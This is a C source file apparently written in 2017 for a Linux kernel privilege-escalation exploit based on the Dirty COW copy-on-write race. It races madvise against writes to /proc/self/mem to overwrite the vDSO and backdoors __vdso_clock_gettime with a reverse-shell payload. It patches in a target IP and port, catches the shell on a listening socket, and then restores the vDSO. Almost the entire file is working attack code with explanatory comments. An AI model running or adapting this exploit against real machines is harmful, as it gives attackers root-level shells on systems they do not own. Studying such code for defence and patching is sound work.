/*
Copyright (c) 2017 Intel Corporation

Permission is hereby granted, free of charge, to any person obtaining a
copy of this software and associated documentation files (the
"Software"), to deal in the Software without restriction, including
without limitation the rights to use, copy, modify, merge, publish,
distribute, sublicense, and/or sell copies of the Software, and to
permit persons to whom the Software is furnished to do so, subject to
the following conditions:

The above copyright notice and this permission notice shall be included
in all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS
OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF
MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.
IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY
CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT,
TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE
SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
*/
#define _GNU_SOURCE
#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/wait.h>
#include <arpa/inet.h>

#include "payload.h"
#include "elf.c"

#define WAIT_LOOP 0x1000

/* Functions which were written by scumjr, some with minor modification. */
int parse_ip_port(char *str, uint32_t *ip, uint16_t *port);
int writeall(int fd, const void *buf, size_t count);
int start_server(uint16_t port);
int catch_shell(int s, int demo);

/* STAGE lets us keep track of whether we are trying to patch the vDSO to be
 * the payload or restore to the original vDSO. */
enum STAGE {
  PATCH,
  RESTORE
};

/* vdso_size is the page size * 2. My understanding is that this is always the
 * case. However it could be determined by reading from /proc/self/maps. */
static uint64_t vdso_size = 0;
/* vdso_addr stores the address of the vDSO. This is set to the return value of
 * getauxval(AT_SYSINFO_EHDR). */
static void *vdso_addr = NULL;
/* vdso_orig gets the vDSO copied into it when the program starts. This
 * effectively saves the vDSO so that we can write this saved copy back when we
 * have caught our shell. */
static void *vdso_orig = NULL;
/* vdso_patched holds a copy of the original vDSO which we are modifying to put
 * the payload into it as well as change it so it calls to the payload. */
static void *vdso_patched = NULL;

/* fork_and_check forks into a new process to check if the vDSO is now the
 * patched version or has been reset to the original version. If we do not fork
 * it gives false positives. */
int fork_and_check(enum STAGE arg, const char *t_name) {
  uint64_t pid;
  int status;

  pid = fork();
  if (pid == 0) {
    /* The child process checks if we are setting the vDSO to vdso_patched,
     * which contains the payload, by memcmping vdso_addr to vdso_patched. Or
     * if we are restoring then it compares the vDSO to the original. If the
     * they are the same we know that we have successfully triggered the CoW
     * bug. Exit with a 0 if the vDSO is what we want it to be. Otherwise we
     * exit with a 1. */
    if (arg == PATCH && 0 == memcmp(vdso_addr, vdso_patched, vdso_size)) {
      printf("[*] [%s] vDSO successfully backdoored\n", t_name);
      exit(0);
    } else if (arg == RESTORE && 0 == memcmp(vdso_addr, vdso_orig, vdso_size)) {
      printf("[*] [%s] vDSO successfully restored\n", t_name);
      exit(0);
    }
    exit(1);
  }

  /* Check the child's exit status to see if we have succeeded in triggering
   * the bug. If so return 1 for yes the exploit succeeded. */
  waitpid(pid, &status, 0);
  if (WIFEXITED(status) && WEXITSTATUS(status) == 0) {
    return 1;
  }

  return 0;
}

/* madvise_it is the thread which calls madvise with MADV_DONTNEED on
 * vdso_addr. This in combination with writing to vdso_addr triggers the CoW
 * bug giving us our exploit. */
static void *madvise_it(void *arg)
{
  uint64_t i, j;

  /* Outer loop calls madvise for WAIT_LOOP times then checks if the vDSO has
   * been patched to be what we want. */
  for(i = 0; i < WAIT_LOOP; ++i) {
    /* Inner loop calls madvise WAIT_LOOP times. This is being exicuted at the
     * same time as the write_it thread is calling write. This causes the CoW
     * bug. */
    for(j = 0; j < WAIT_LOOP; ++j) {
      madvise(vdso_addr, vdso_size, MADV_DONTNEED);
    }

    /* Fork and check if we have patched the vDSO to be either orig or patched
     * successfully. If so then stop this thread because it is no longer
     * needed. */
    if (fork_and_check((enum STAGE)arg, "madvise")) {
      return NULL;
    }
  }

  printf("[*] [madvise] vDSO did not change\n");

  return NULL;
}

/* write_it is a thread run at the same time as madvise_it. This thread opens
 * /proc/self/mem which is this processes memory as a file. It seeks to the
 * address we want to change, vdso_addr, and then writes the data we want at
 * the address to there. This data is either vdso_patched when we are trying to
 * add our payload to the vDSO. Or vdso_orig when we have caught the shell and
 * want to restore the vDSO to normal. */
static void *write_it(void *arg) {
  uint64_t i, j;
  int fd;

  fd = open("/proc/self/mem", O_RDWR);
  if (fd == -1) {
    perror("Failed to open /proc/self/mem");
    return NULL;
  }

  /* Outer loop seeks and writes for WAIT_LOOP times, then checks if the bug
   * was triggered. The writes are running at the same time as madvise in
   * madvise_it which triggers the CoW bug. */
  for(i = 0; i < WAIT_LOOP; ++i) {
    /* Inner loop seeks to vdso_addr in /proc/self/mem and then writes either
     * vdso_patched or vdso_orig to it. It does this WAIT_LOOP times so as to
     * overlap with the madvise calls. */
    for(j = 0; j < WAIT_LOOP; ++j) {
      /* Write at the location of the vDSO */
      if (lseek(fd, (uint64_t)vdso_addr, SEEK_SET) == -1) {
        goto WRITE_IT_FAILED;
      }

      if ((enum STAGE)arg == PATCH) {
        /* If we are in the patch stage replace the vDSO with the backdoored
         * version containing our reverse shell. This is vdso_patched. */
        write(fd, vdso_patched, vdso_size);
      } else if ((enum STAGE)arg == RESTORE) {
        /* If we are in the restore stage replace the vDSO with the original
         * version. This is vdso_orig. */
        write(fd, vdso_orig, vdso_size);
      }
    }

    /* Fork and check if we have patched the vDSO to be either orig or patched
     * successfully. If so then stop this thread because it is no longer
     * needed. Before we exit we close the /proc/self/mem file. */
    if (fork_and_check((enum STAGE)arg, "write")) {
      close(fd);
      return NULL;
    }
  }

WRITE_IT_FAILED:
  close(fd);

  printf("[*] [write] Failed to change vDSO\n");

  return NULL;
}

/* exploit runs the madvise and write_it threads. */
void exploit(enum STAGE stage) {
  pthread_t p1, p2;

  pthread_create(&p1, NULL, madvise_it, (void *)stage);
  pthread_create(&p2, NULL, write_it, (void *)stage);

  pthread_join(p1, NULL);
  pthread_join(p2, NULL);
}

/* num_bytes_to_copy finds the number of bytes, which are instructions, we need
 * to copy from the start of the function we are backdooring to the location
 * for the missed instructions in the payload. Because x86_64 instruction set
 * has instructions on varying length I choose to look at the output of objdump
 * to simplify this processes. To my knowledge the only other approach would be
 * to link to a disassembly library or figure out the length of any given
 * operation myself. Both of these were sure to take longer than parsing
 * objdump. */
static uint64_t num_bytes_to_copy(uint64_t backdoored_func) {
  int num = 0;
  int fd = 0;
  size_t bread = 0;
  char *newline = NULL, *start_bytes = NULL, *buf;
  char popen_str[128], buffer[4096];
  FILE *p;

  memset(buffer, 0, 4096);

  /* Write the vdso to a file. */
  fd = open("/tmp/vdso", O_CREAT|O_RDWR|O_TRUNC|O_SYNC, 0600);
  if (fd < 0) {
    perror("Failed to dump vdso to file");
    exit(1);
  }
  write(fd, vdso_addr, vdso_size);
  close(fd);

  /* Have objdump read the vDSO from the file we just wrote. Use grep to look
   * for the three instructions which start at the address of the function we
   * are backdooring. The output of objdump piped though grep will look like
   * this.
         ab0:   55                      push   %rbp
         ab1:   48 89 e5                mov    %rsp,%rbp
         ab4:   41 56                   push   %r14
         ab6:   41 55                   push   %r13
         ab8:   41 54                   push   %r12
         aba:   53                      push   %rbx
  * The instructions differ for each kernel and therefore the length of these
  * instructions. We then parse the middle column to get those bytes and count
  * how many bytes there are in the instructions for the first three lines. */
  sprintf(popen_str, "objdump -D /tmp/vdso | grep -A 3 %lx:", backdoored_func);
  p = popen(popen_str, "re");

  bread = fread(buffer, 1, 4095, p);
  if (bread <= 0 || bread > 4095) {
    perror("Error reading from objdump output");
    exit(1);
  }
  buffer[bread] = '\0';

  buf = buffer;
  newline = strstr(buf, "\n");
  while (*buf != '\0' && newline != NULL) {
    *newline = '\0';
    /* Skip past the address */
    start_bytes = strstr(buf, ":");
    if (start_bytes == NULL) {
      break;
    }
    ++start_bytes;
    /* Skip whitespace */
    while (*start_bytes == ' ' || *start_bytes == '\t') {
      ++start_bytes;
    }
    /* Count bytes until you get to more whitespace */
    while (*start_bytes != ' ' && *start_bytes != '\t') {
      ++num;
      start_bytes += 3;
    }
    buf = newline + 1;
    newline = strstr(buf, "\n");
  }

  pclose(p);

  return num;
}

int main(int argc, char *argv[])
{
  char missed_instructions_string[] = "instructions";
  char backdoored_func_name[] = "__vdso_clock_gettime";
  char *buf;
  void *edit_payload = NULL, *patch = NULL;
  uint64_t backdoored_func = 0, bytes_to_copy = 0;
  uint32_t ip = 0;
  uint16_t port = 0;
#ifdef EXPLOIT
  int demo = 0, s = 0;
#endif

  /* Set the size of the vDSO */
  vdso_size = 2 * getpagesize();
  /* Set the vDSO address */
  vdso_addr = (void *)getauxval(AT_SYSINFO_EHDR);

#ifdef DUMP_VDSO
  write(STDOUT_FILENO, vdso_addr, vdso_size);
  return 0;
#endif

  ip = htonl(INADDR_LOOPBACK);
  port = htons(1234);

  if (argc > 1 && parse_ip_port(argv[1], &ip, &port) != 0) {
    return EXIT_FAILURE;
  }

#ifdef EXPLOIT
  if (argc > 2 && strncmp(argv[2], "demo", 4) == 0) {
    demo = 1;
  }

  /* Create a socket server to listen for the shell. */
  s = start_server(port);
#endif

  /* Make a copy of the payload which we will edit */
  edit_payload = malloc(payload_len);
  memcpy(edit_payload , payload, payload_len);
  /* Save a copy of the vDSO we will leave untouched */
  vdso_orig = malloc(vdso_size);
  memcpy(vdso_orig, vdso_addr, vdso_size);
  /* Save a copy of the vDSO which will have the backdoor */
  vdso_patched = malloc(vdso_size);
  memcpy(vdso_patched, vdso_addr, vdso_size);

  /* Find the address of the backdoored function reletive to the vDSO */
  backdoored_func = (uint64_t)vdso_resolve(backdoored_func_name);
  if (backdoored_func == -1) {
    printf("[-] Failed to find address of %s in the vDSO\n", backdoored_func_name);
    return 1;
  }
  /* There be strange things going on with the pages on some systems.
   * Masking to get only the bottom 3 bytes gives us the offest from
   * the vdso which is always at 000 of those 3 bytes, to the function. */
  backdoored_func &= 0xFFF;

  /* Find the address of the place to insert the missed instructions */
  patch = memmem(edit_payload, payload_len,
      missed_instructions_string, strlen(missed_instructions_string));
  /* Set that area to be nops */
  memset(patch, 0x90, strlen(missed_instructions_string));
  /* Find the number of bytes to copy. x86 is all unaligned instructions so this
   * is tick to make sure don't copy only part of an instruction */
  bytes_to_copy = num_bytes_to_copy(backdoored_func);
  /* Copy the instructions which we are going to destroy with the call to the
   * missed instructions area */
  memcpy(patch, (void *)(vdso_orig + backdoored_func), bytes_to_copy);

  /* Patch the ip address */
  patch = memmem(edit_payload, payload_len, "\xde\xc0\xad\xde", 4);
  memcpy(patch, &ip, 4);

  /* Patch the port */
  patch = memmem(edit_payload, payload_len, "\x37\x13", 2);
  memcpy(patch, &port, 2);

  /* Make the backdoored function call to the payload placed in the backdoored
   * version of the vDSO */
  memset((void *)((uint64_t)vdso_patched + (uint64_t)backdoored_func), 0x90, bytes_to_copy);
  buf = (void *)((uint64_t)vdso_patched + (uint64_t)backdoored_func);
  /* e8 is a call instruction */
  buf[0] = '\xe8';
  /* Offset from the backdoored function to the payload */
  patch = (void *)((uint64_t)vdso_size - (uint64_t)payload_len - (uint64_t)backdoored_func);
  /* Make the pc relative call to the payload, subtract 5 because instruciton
   * increments pc and the instruction is five bytes long */
  *(uint32_t *)&buf[1] = (uint64_t)patch - (uint64_t)5;

  /* Put the payload in the backdoored version of the vDSO */
  memcpy((void *)((uint64_t)vdso_patched + (uint64_t)vdso_size - (uint64_t)payload_len), edit_payload, payload_len);

#ifdef EXPLOIT
  exploit(PATCH);
#endif

#ifdef DUMP_PATCHED
  if (fork() == 0) {
    write(STDOUT_FILENO, vdso_addr, vdso_size);
    return 0;
  }
#endif

#ifdef EXPLOIT
  /* Accept the shell the payload has connected to the server. */
  catch_shell(s, demo);
#endif

  /* Free our copies of the vDSO and the editable payload. */
  free(edit_payload);
  free(vdso_orig);
  free(vdso_patched);

  return 0;
}
